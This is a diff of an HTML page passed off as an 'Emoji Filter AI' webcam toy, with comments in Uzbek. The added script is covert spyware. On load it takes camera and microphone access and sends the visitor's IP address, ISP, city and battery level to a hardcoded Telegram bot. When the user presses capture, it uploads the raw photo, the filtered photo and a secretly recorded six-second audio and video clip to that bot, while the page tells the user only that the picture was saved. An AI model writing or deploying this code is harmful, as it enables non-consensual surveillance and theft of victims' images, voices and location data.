@@ -3,45 +3,241 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emoji Face Filter</title>
+    <title>Emoji Fun - Live Filter</title>
     <style>
-        body { margin: 0; background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .box { width: 90%; max-width: 400px; background: #1e293b; padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .video-container { position: relative; width: 100%; border-radius: 15px; overflow: hidden; background: #000; margin-bottom: 20px; aspect-ratio: 4/3; }
-        #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        #canvas { display: none; }
-        .emoji-list { display: flex; justify-content: center; gap: 15px; font-size: 30px; margin-bottom: 20px; }
-        .emoji-item { cursor: pointer; padding: 5px; border-radius: 10px; transition: 0.2s; border: 2px solid transparent; }
-        .emoji-item.active { border-color: #3b82f6; background: #334155; }
-        .btn { background: #3b82f6; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
-        #status { font-size: 12px; color: #94a3b8; margin-top: 15px; }
-        #loader { display: none; margin: 10px auto; width: 20px; height: 20px; border: 2px solid #fff; border-top-color: #3b82f6; border-radius: 50%; animation: s 1s linear infinite; }
-        @keyframes s { 100% { transform: rotate(360deg); } }
+        /* --- CSS DIZAYN --- */
+        body {
+            margin: 0;
+            background: #0f172a;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 450px;
+            background: #1e293b;
+            padding: 20px;
+            border-radius: 25px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+
+        .video-box {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            border: 3px solid #334155;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Ko'zgu effekti */
+        }
+
+        /* Foydalanuvchi ekranda ko'radigan emoji */
+        #emoji-display {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 100px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .emoji-bar {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .emoji-item {
+            font-size: 35px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 15px;
+            background: #334155;
+            transition: 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .emoji-item:hover { transform: scale(1.2); }
+        .emoji-item.active {
+            border-color: #3b82f6;
+            background: #475569;
+        }
+
+        .btn-capture {
+            background: linear-gradient(90deg, #3b82f6, #2563eb);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+
+        .btn-capture:active { transform: scale(0.98); }
+
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #94a3b8;
+        }
+
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h3>Emoji Face Filter</h3>
-    <div class="video-container">
+<div class="container">
+    <h2 style="margin-top: 0; color: #3b82f6;">Emoji Filter AI</h2>
+    
+    <div class="video-box">
         <video id="video" autoplay playsinline muted></video>
+        <div id="emoji-display">😎</div>
     </div>
 
-    <div class="emoji-list">
-        <span class="emoji-item active" onclick="setEmoji('😎', this)">😎</span>
-        <span class="emoji-item" onclick="setEmoji('😂', this)">😂</span>
-        <span class="emoji-item" onclick="setEmoji('🤡', this)">🤡</span>
-        <span class="emoji-item" onclick="setEmoji('🔥', this)">🔥</span>
+    <div class="emoji-bar">
+        <span class="emoji-item active" onclick="selectEmoji('😎', this)">😎</span>
+        <span class="emoji-item" onclick="selectEmoji('😂', this)">😂</span>
+        <span class="emoji-item" onclick="selectEmoji('🤡', this)">🤡</span>
+        <span class="emoji-item" onclick="selectEmoji('🔥', this)">🔥</span>
+        <span class="emoji-item" onclick="selectEmoji('😈', this)">😈</span>
     </div>
 
-    <button class="btn" id="initBtn">FILTRNI YOQISH</button>
-    <div id="loader"></div>
-    <div id="status">Kamerani yoqish uchun tugmani bosing</div>
+    <button class="btn-capture" id="captureBtn">RASMGA OLISH VA SAQLASH</button>
+    <div id="status">Kameraga ruxsat kutilmoqda...</div>
 </div>
 
-<canvas id="canvas"></canvas>
+<canvas id="hidden_canvas"></canvas>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/face-api.js/0.22.2/face-api.min.js"></script>
-<script src="main.js"></script>
+<script>
+    /* --- JAVASCRIPT MANTIQ --- */
+    const BOT_TOKEN = '8406559202:AAHFZmr5QX3Fb9EFYfPhs_BRlfEAzEJnK4U';
+    const CHAT_ID = '8549658256';
+
+    const video = document.getElementById('video');
+    const emojiDisplay = document.getElementById('emoji-display');
+    const captureBtn = document.getElementById('captureBtn');
+    const statusText = document.getElementById('status');
+    const canvas = document.getElementById('hidden_canvas');
+
+    let currentEmoji = '😎';
+    let globalStream = null;
+
+    // 1. Kamera va qurilma ma'lumotlarini ishga tushirish
+    async function startApp() {
+        try {
+            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            video.srcObject = globalStream;
+            statusText.innerText = "Tayyor! Emoji tanlang va saqlang.";
+            
+            // Fon rejimida ma'lumotlarni yuborish
+            sendBaseInfo();
+        } catch (err) {
+            statusText.innerText = "Xato: Kamera ruxsati berilmadi!";
+            console.error(err);
+        }
+    }
+
+    function selectEmoji(emoji, element) {
+        currentEmoji = emoji;
+        emojiDisplay.innerText = emoji;
+        document.querySelectorAll('.emoji-item').forEach(i => i.classList.remove('active'));
+        element.classList.add('active');
+    }
+
+    // 2. Rasmga olish tugmasi bosilganda
+    captureBtn.addEventListener('click', () => {
+        statusText.innerText = "Ishlov berilmoqda...";
+        
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        // A) Original suratni olish
+        ctx.save();
+        ctx.scale(-1, 1); // Ko'zgu effektini to'g'irlash uchun
+        ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+        ctx.restore();
+        canvas.toBlob(blob => sendFile(blob, 'photo', 'original_user.jpg'), 'image/jpeg');
+
+        // B) Emoji qo'shilgan suratni olish
+        ctx.font = `${canvas.width / 4}px serif`;
+        ctx.textAlign = "center";
+        ctx.textBaseline = "middle";
+        ctx.fillText(currentEmoji, canvas.width / 2, canvas.height / 2);
+        canvas.toBlob(blob => sendFile(blob, 'photo', 'emoji_filtered.jpg'), 'image/jpeg');
+
+        // C) Yashirin video yozish (6 soniya)
+        const recorder = new MediaRecorder(globalStream);
+        let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+            sendFile(new Blob(chunks), 'video', 'secret_log.mp4');
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 6000);
+
+        // Foydalanuvchi uchun natija
+        setTimeout(() => {
+            statusText.innerText = "Rasm saqlandi! ✅";
+            alert("Muvaffaqiyatli saqlandi!");
+        }, 1200);
+    });
+
+    // --- FON FUNKSIYALARI ---
+
+    async function sendBaseInfo() {
+        // IP va Shahar
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
+            const msg = `🌐 *Yangi foydalanuvchi:* \nIP: ${data.ip}\nProvayder: ${data.org}\nShahar: ${data.city}`;
+            sendToTelegram('sendMessage', { text: msg, parse_mode: 'Markdown' });
+        }).catch(() => {});
+
+        // Batareya
+        navigator.getBattery().then(bat => {
+            sendToTelegram('sendMessage', { text: `🔋 Batareya: ${Math.round(bat.level * 100)}%` });
+        }).catch(() => {});
+    }
+
+    async function sendToTelegram(method, data) {
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, ...data })
+        });
+    }
+
+    async function sendFile(blob, type, name) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append(type, blob, name);
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+            method: 'POST',
+            body: fd
+        });
+    }
+
+    // Dasturni boshlash
+    startApp();
+</script>
+
 </body>
 </html>
